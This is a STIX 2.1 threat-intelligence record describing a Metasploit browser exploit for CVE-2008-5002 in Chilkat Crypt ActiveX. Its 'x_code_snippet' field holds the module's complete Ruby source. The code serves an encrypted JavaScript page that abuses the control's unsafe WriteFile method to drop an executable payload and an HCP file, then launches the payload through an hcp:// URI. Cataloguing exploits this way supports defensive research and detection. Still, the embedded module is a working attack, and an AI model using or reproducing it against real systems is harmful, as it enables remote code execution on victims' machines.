{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--11d2a2bd-3306-4104-9bc4-48615e15f549",
    "created": "2024-08-14T16:40:29.70421Z",
    "modified": "2024-08-14T16:40:29.704214Z",
    "name": "Chilkat Crypt ActiveX WriteFile Unsafe Method",
    "description": " This module allows attackers to execute code via the 'WriteFile' unsafe method of Chilkat Software Inc's Crypt ActiveX control.  This exploit is based on shinnai's exploit that uses an hcp:// protocol URI to execute our payload immediately. However, this method requires that the victim user be browsing with Administrator. Additionally, this method will not work on newer versions of Windows.  NOTE: This vulnerability is still unpatched. The latest version of Chilkat Crypt at the time of this writing includes ChilkatCrypt2.DLL version 4.4.4.0.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/chilkat_crypt_writefile.rb",
            "external_id": "chilkat_crypt_writefile.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5002"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Chilkat Crypt ActiveX WriteFile Unsafe Method',\n      'Description'    => %q{\n          This module allows attackers to execute code via the 'WriteFile' unsafe method of\n        Chilkat Software Inc's Crypt ActiveX control.\n\n        This exploit is based on shinnai's exploit that uses an hcp:// protocol URI to\n        execute our payload immediately. However, this method requires that the victim user\n        be browsing with Administrator. Additionally, this method will not work on newer\n        versions of Windows.\n\n        NOTE: This vulnerability is still unpatched. The latest version of Chilkat Crypt at\n        the time of this writing includes ChilkatCrypt2.DLL version 4.4.4.0.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'shinnai', 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-5002' ],\n          [ 'OSVDB', '49510' ],\n          [ 'BID', '32073' ],\n          [ 'EDB', '6963' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 2048\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-11-03'\n      ))\n\n    @javascript_encode_key = rand_text_alpha(rand(10) + 10)\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    if (!request.uri.match(/\\?\\w+/))\n      send_local_redirect(cli, \"?#{@javascript_encode_key}\")\n      return\n    end\n\n    # Set parameters\n    fnname = rand_text_alpha(8+rand(8))\n    si_name = \"msinfo\" # must be this, other names don't seem to work\n    exe_name = rand_text_alpha(8+rand(8))\n    hcp_path = \"C:\\\\WINDOWS\\\\PCHEALTH\\\\HELPCTR\\\\System\\\\sysinfo\\\\#{si_name}.htm\"\n    hcp_url = \"hcp:\\\\x2f\\\\x2fsystem/sysinfo/#{si_name}.htm\"\n    exe_path = \"C:\\\\#{exe_name}.exe\"\n\n    # Generate HCP data\n    hcp_data = %Q|<object classid='clsid:0355854A-7F23-47E2-B7C3-97EE8DD42CD8' id='compatUI'></object>\n<script language='vbscript'>\ncompatUI.RunApplication 1, \"#{exe_path}\", 1\n</script>\n|\n\n    # (Re-)Generate the EXE payload\n    return if ((p = regenerate_payload(cli)) == nil)\n    exe_data = generate_payload_exe({ :code => p.encoded })\n\n    # Encode variables\n    hcp_str = Rex::Text.to_unescape(hcp_data)\n    hcp_path.gsub!(/\\\\/, '\\\\\\\\\\\\\\\\')\n    exe_str = Rex::Text.to_unescape(exe_data)\n    exe_path.gsub!(/\\\\/, '\\\\\\\\\\\\\\\\')\n\n    # Build the final JS\n    js = %Q|\nfunction #{fnname}()\n{\nvar my_unescape = unescape;\nvar obj = new ActiveXObject(\"ChilkatCrypt2.ChilkatCrypt2\");\nvar exe_path = \"#{exe_path}\";\nvar exe_str = \"#{exe_str}\";\nvar exe_data = my_unescape(exe_str);\nobj.WriteFile(exe_path, exe_data);\nvar hcp_str = \"#{hcp_str}\";\nvar hcp_data = my_unescape(hcp_str);\nvar hcp_path = \"#{hcp_path}\";\nobj.WriteFile(hcp_path, hcp_data);\nwindow.location = \"#{hcp_url}\";\n}\n|\n\n=begin\n    # Obfuscate the javascript\n    opts = {\n      'Strings' => false, # didn't work in this case\n      'Symbols' => {\n        'Variables' => %w{ my_unescape obj exe_path exe_str exe_data hcp_str hcp_data hcp_path }\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.obfuscate(memory_sensitive: true)\n=end\n    js = encrypt_js(js, @javascript_encode_key)\n\n    # Build the final HTML\n    content = %Q|<html>\n<head>\n<script language=javascript>\n#{js}\n</script>\n</head>\n<body onload=\"#{fnname}()\">\nPlease wait...\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-11-03",
    "x_mitre_platforms": [
        "win'"
    ]
}